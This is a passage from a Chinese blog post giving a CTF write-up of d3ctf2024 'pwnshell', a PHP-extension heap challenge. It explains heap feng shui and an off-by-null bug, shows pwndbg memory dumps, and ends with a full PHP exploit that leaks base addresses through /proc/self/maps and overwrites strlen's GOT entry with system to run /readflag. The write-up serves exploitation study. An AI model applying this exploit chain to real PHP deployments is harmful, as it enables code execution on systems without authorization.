+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep <span class="string">&#x27; system@@&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781704979157-4a1fa4e0-ea9d-425a-b45b-428494df06fe.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -r vuln.so | grep strlen</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781705009572-1c90c75e-11c0-43a8-8c69-f82361525be3.png"></p>
+<h4 id="构造堆风水"><a href="#构造堆风水" class="headerlink" title="构造堆风水"></a>构造堆风水</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="string">&#x27;bbbbbbb&#x27;</span>);  <span class="comment"># 0</span></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;cccccccccccccccccccccccc&#x27;</span>, <span class="string">&#x27;ddddddd&#x27;</span>);  <span class="comment"># 1</span></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;cccccccccccccccccccccccc&#x27;</span>, <span class="string">&#x27;ddddddd&#x27;</span>);  <span class="comment"># 2</span></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;/readflag;#&#x27;</span>, <span class="string">&#x27;/readflag;#&#x27;</span>);           <span class="comment"># 3</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">11</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;cccccccc&#x27;</span>, <span class="string">&#x27;ddddddd&#x27;</span>);</span><br><span class="line">&#125;                                                  <span class="comment"># 14</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>name 长度 24 的对象：Hacker 块大小 &#x3D; 0x10 + 0x18 &#x3D; 0x28</p>
+<p>name 长度 8 的对象：Hacker 块大小 &#x3D; 0x10 + 0x08 &#x3D; 0x18</p>
+<p>因此可以得出：</p>
+<ul>
+<li>#0 #1 #2 都是 0x28 大小的 Hacker 块</li>
+<li>#3 是特殊触发对象，名字是 “&#x2F;readflag;#”</li>
+<li>#4 ~ #14 都是 0x18 大小的 Hacker 块</li>
+</ul>
+<h4 id="复用-chunk12-和-13-进行-off-by-null"><a href="#复用-chunk12-和-13-进行-off-by-null" class="headerlink" title="复用 chunk12 和 13 进行 off-by-null"></a>复用 chunk12 和 13 进行 off-by-null</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">13</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="string">&#x27;hhhhhhh&#x27;</span>);  <span class="comment"># 15</span></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">12</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="string">&#x27;ffffffff&#x27;</span>); <span class="comment"># 16</span></span><br></pre></td></tr></table></figure>
+
+<p>在申请完<code>addHacker(&#39;aaaaaaaaaaaaaaaaaaaaaaaa&#39;, &#39;hhhhhhh&#39;);</code>的时候我们看一下内存：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781779912862-931dfcaa-cb4b-4047-872f-6d0ca5de4306.png"></p>
+<p>这里我圈出来了两个指针，前者是 name 指针，后者是 content 指针</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele  <span class="number">0x7ffff62041f8</span> </span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffff62041f8</span> —▸ <span class="number">0x7ffff6204228</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffff6204200</span> ◂— <span class="number">0x18</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffff6204208</span> ◂— <span class="number">0x68686868686868</span> <span class="comment">/* &#x27;hhhhhhh&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffff6204210</span> —▸ <span class="number">0x7ffff6203070</span> ◂— <span class="number">0x6363636363636363</span> (<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffff6204218</span> ◂— <span class="number">8</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7ffff6204220</span> ◂— <span class="number">0x64646464646464</span> <span class="comment">/* &#x27;ddddddd&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7ffff6204228</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7ffff6204230</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffff62041f8</span> —▸ <span class="number">0x7ffff6204228</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffff6204200</span> ◂— <span class="number">0x18</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffff6204208</span> ◂— <span class="number">0x68686868686868</span> <span class="comment">/* &#x27;hhhhhhh&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffff6204210</span> —▸ <span class="number">0x7ffff6203070</span> ◂— <span class="number">0x6363636363636363</span> (<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffff6204218</span> ◂— <span class="number">8</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7ffff6204220</span> ◂— <span class="number">0x64646464646464</span> <span class="comment">/* &#x27;ddddddd&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7ffff6204228</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7ffff6204230</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
+
+<p>当前可以看到 content 的 ptr 是 0x7ffff6204228</p>
+<p>由于之前分析过的 off-by-null，他会在我们的堆内存的 content 的最后加上 \x00，也就是说他会越界写 \x00</p>
+<p>当我们复用堆块 12 的时候，content 就会越界写到 chunk13 的 name 指针，让最低的一位指针为 \x00</p>
+<p><code>0x00007ffff6204228 -&gt; 0x00007ffff6204200</code>可以看一下下面的图：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781788033408-c20a69c2-8230-4beb-b5d4-d70263a1dff8.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781787710000-5d1de221-c8cc-40b6-9e1e-220b0cbc062f.png"></p>
+<p>在此之后，如果我们可以修改 chunk13 的 name 部分，由于 chunk13 的 name 和 chunk14 的 content 指针在地址上已经篡改为相邻的，我们修改 chunk13 的 name 时就可以修改到 chunk14 的 content 指针。</p>
+<h4 id="篡改-strlen-为-system，调用-binsh"><a href="#篡改-strlen-为-system，调用-binsh" class="headerlink" title="篡改 strlen 为 system，调用 binsh"></a>篡改 strlen 为 system，调用 binsh</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">13</span>, <span class="title function_ invoke__">p64</span>(<span class="number">0x18</span>) . <span class="string">&#x27;hhhhhhhh&#x27;</span> . <span class="title function_ invoke__">p64</span>(<span class="variable">$strlen_got</span>));</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">14</span>, <span class="title function_ invoke__">p64</span>(<span class="variable">$system</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;before trigger&quot;</span> . PHP_EOL;           <span class="comment"># printf(&quot;before trigger\n&quot;);   </span></span><br><span class="line"><span class="title function_ invoke__">displayHacker</span>(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL . <span class="string">&quot;after trigger&quot;</span> . PHP_EOL;  <span class="comment"># printf(&quot;\nafter trigger\n&quot;);  </span></span><br></pre></td></tr></table></figure>
+
+<p><code>editHacker(13, p64(0x18) . &#39;hhhhhhhh&#39; . p64($strlen_got));</code>执行前的堆情况：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781775374369-c8e69ce2-3781-4c7a-9c67-bfcc1fdb00fc.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781777123607-131b57af-4a4d-45fb-97c5-7fdddfb275fe.png"></p>
+<p>我们根据上面的思路用 chunk13 篡改 content 指针为 strlen</p>
+<p>为了不影响其他内容，我们前面选择正常覆盖不改变<code>p64(0x18) . &#39;hhhhhhhh&#39;</code>即可，执行之后：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781775270396-1b600897-19cd-4b6f-b639-3b781fadcde4.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781777183288-0864e9a8-0d6f-47fe-bd6d-b79e3ed1c5b9.png"></p>
+<p>可以发现此时 chunk14 的指针位已经被修改为 strlen 了，之后修改 chunk14 篡改为 system 即可。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1781787467969-42904d03-2fae-4f03-92fd-3d7130408200.png"></p>
+<h3 id="总-EXP："><a href="#总-EXP：" class="headerlink" title="总 EXP："></a>总 EXP：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span> = [];</span><br><span class="line"><span class="variable">$mbase</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$hex</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$hex</span>) % <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$hex</span> = <span class="string">&quot;0&quot;</span> . <span class="variable">$hex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_pad</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex</span>)), <span class="number">8</span>, <span class="string">&quot;\0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>, <span class="variable">$mbase</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/([0-9a-f]+)-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc\.so\.6/&#x27;</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/([0-9a-f]+)-[0-9a-f]+ .* \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln\.so/&#x27;</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">maps</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;/proc/self/maps&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">leakaddr</span>(<span class="title function_ invoke__">maps</span>());</span><br><span class="line"><span class="variable">$vuln_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>] ?? <span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>] ?? <span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="variable">$strlen_got</span> = <span class="variable">$vuln_base</span> + <span class="number">0x4020</span>;</span><br><span class="line"><span class="variable">$system</span> = <span class="variable">$libc_base</span> + <span class="number">0x53110</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;libc=%x\n&quot;</span>, <span class="variable">$libc_base</span>);                                                                                                                                                                                          </span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;vuln=%x\n&quot;</span>, <span class="variable">$vuln_base</span>);                                                                                                                                                                                          </span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;strlen_got=%x\n&quot;</span>, <span class="variable">$strlen_got</span>);                                                                                                                                                                                   </span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;system=%x\n&quot;</span>, <span class="variable">$system</span>);     </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="string">&#x27;bbbbbbb&#x27;</span>);  <span class="comment"># 0</span></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;cccccccccccccccccccccccc&#x27;</span>, <span class="string">&#x27;ddddddd&#x27;</span>);  <span class="comment"># 1</span></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;cccccccccccccccccccccccc&#x27;</span>, <span class="string">&#x27;ddddddd&#x27;</span>);  <span class="comment"># 2</span></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;/readflag;#&#x27;</span>, <span class="string">&#x27;/readflag;#&#x27;</span>);           <span class="comment"># 3</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">11</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;cccccccc&#x27;</span>, <span class="string">&#x27;ddddddd&#x27;</span>);</span><br><span class="line">&#125;                                                  <span class="comment"># 14</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">13</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="string">&#x27;hhhhhhh&#x27;</span>);  <span class="comment"># 15</span></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">12</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="string">&#x27;ffffffff&#x27;</span>); <span class="comment"># 16</span></span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">13</span>, <span class="title function_ invoke__">p64</span>(<span class="number">0x18</span>) . <span class="string">&#x27;hhhhhhhh&#x27;</span> . <span class="title function_ invoke__">p64</span>(<span class="variable">$strlen_got</span>));</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">14</span>, <span class="title function_ invoke__">p64</span>(<span class="variable">$system</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;before trigger&quot;</span> . PHP_EOL;           <span class="comment"># printf(&quot;before trigger\n&quot;);   </span></span><br><span class="line"><span class="title function_ invoke__">displayHacker</span>(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL . <span class="string">&quot;after trigger&quot;</span> . PHP_EOL;  <span class="comment"># printf(&quot;\nafter trigger\n&quot;);  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="参考资料：https-ixout-github-io-posts-5022-index-html-WACON2023-heaphp"><a href="#参考资料：https-ixout-github-io-posts-5022-index-html-WACON2023-heaphp" class="headerlink" title="参考资料：https://ixout.github.io/posts/5022/index.html#WACON2023-heaphp"></a>参考资料：<a target="_blank" rel="noopener" href="https://ixout.github.io/posts/5022/index.html#WACON2023-heaphp">https://ixout.github.io/posts/5022/index.html#WACON2023-heaphp</a></h2><h2 id="title-‘PHP-PWN-d3ctf2024-pwnshell’date-2026-06-19-21-36-09tags-pwn-php-d3ctfcategories-Notes"><a href="#title-‘PHP-PWN-d3ctf2024-pwnshell’date-2026-06-19-21-36-09tags-pwn-php-d3ctfcategories-Notes" class="headerlink" title="title: ‘PHP-PWN d3ctf2024-pwnshell’date: 2026-06-19 21:36:09tags:  - pwn  - php  - d3ctfcategories:  - Notes"></a>title: ‘PHP-PWN d3ctf2024-pwnshell’<br>date: 2026-06-19 21:36:09<br>tags:<br>  - pwn<br>  - php<br>  - d3ctf<br>categories:<br>  - Notes</h2>
+    </div>
+    <footer class="article-footer">
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="" class="lazyload">
+        <a href="/HFTTC.github.io/2026/06/19/Pwn.college-Kernel-1-6/" aria-label="前一篇: no title" title="前一篇: no title"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            (no title)
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+        <img data-src="/HFTTC.github.io/images/pwn/covers/ciscn-2023-strangetalkbot.jpg" data-sizes="auto" alt="[CISCN 2023]StrangeTalkBot" class="lazyload">
+      <a href="/HFTTC.github.io/2026/06/09/%5BCISCN%202023%5DStrangeTalkBot/" aria-label="后一篇: [CISCN 2023]StrangeTalkBot"  title="后一篇: [CISCN 2023]StrangeTalkBot"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          [CISCN 2023]StrangeTalkBot
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        252.7k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        20:55
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPPWN-GDB-%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">PHPPWN GDB 流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E9%95%9C%E5%83%8F"><span class="toc-number">1.1.</span> <span class="toc-text">构建镜像</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%A6%E7%89%B9%E6%9D%83%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">带特权启动容器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.</span> <span class="toc-text">监听端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">gdb 连接远程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-%E8%B0%83%E8%AF%95%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.5.</span> <span class="toc-text">gdb 调试的注意事项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8-exp-%E5%BD%93%E4%B8%AD%E4%B8%8B%E6%96%AD%E7%82%B9%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">在 exp 当中下断点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.</span> <span class="toc-text">还有一种方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA-%E5%88%86%E6%9E%90%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">IDA 分析函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-addHacker"><span class="toc-number">2.1.</span> <span class="toc-text">zif_addHacker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-removeHacker"><span class="toc-number">2.2.</span> <span class="toc-text">zif_removeHacker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-editHacker"><span class="toc-number">2.3.</span> <span class="toc-text">zif_editHacker</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zif-displayHacker"><span class="toc-number">2.4.</span> <span class="toc-text">zif_displayHacker</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E7%BB%95%E8%BF%87-ASLR%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">信息泄露（绕过 ASLR）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#leakaddr-buffer-%E5%9F%BA%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">3.2.</span> <span class="toc-text">leakaddr($buffer) 基地址泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#p64-addr-%E6%95%B0%E6%8D%AE%E7%9A%84%E6%89%93%E5%8C%85"><span class="toc-number">3.3.</span> <span class="toc-text">p64($addr)  数据的打包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%85%B3%E9%94%AE%E5%9C%B0%E5%9D%80"><span class="toc-number">3.4.</span> <span class="toc-text">泄露关键地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%A0%86%E9%A3%8E%E6%B0%B4"><span class="toc-number">3.5.</span> <span class="toc-text">构造堆风水</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%94%A8-chunk12-%E5%92%8C-13-%E8%BF%9B%E8%A1%8C-off-by-null"><span class="toc-number">3.6.</span> <span class="toc-text">复用 chunk12 和 13 进行 off-by-null</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AF%A1%E6%94%B9-strlen-%E4%B8%BA-system%EF%BC%8C%E8%B0%83%E7%94%A8-binsh"><span class="toc-number">3.7.</span> <span class="toc-text">篡改 strlen 为 system，调用 binsh</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">总 EXP：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9Ahttps-ixout-github-io-posts-5022-index-html-WACON2023-heaphp"><span class="toc-number">5.</span> <span class="toc-text">参考资料：https:&#x2F;&#x2F;ixout.github.io&#x2F;posts&#x2F;5022&#x2F;index.html#WACON2023-heaphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#title-%E2%80%98PHP-PWN-d3ctf2024-pwnshell%E2%80%99date-2026-06-19-21-36-09tags-pwn-php-d3ctfcategories-Notes"><span class="toc-number">6.</span> <span class="toc-text">title: ‘PHP-PWN d3ctf2024-pwnshell’date: 2026-06-19 21:36:09tags:  - pwn  - php  - d3ctfcategories:  - Notes</span></a></li></ol>
+</div>
+</div>
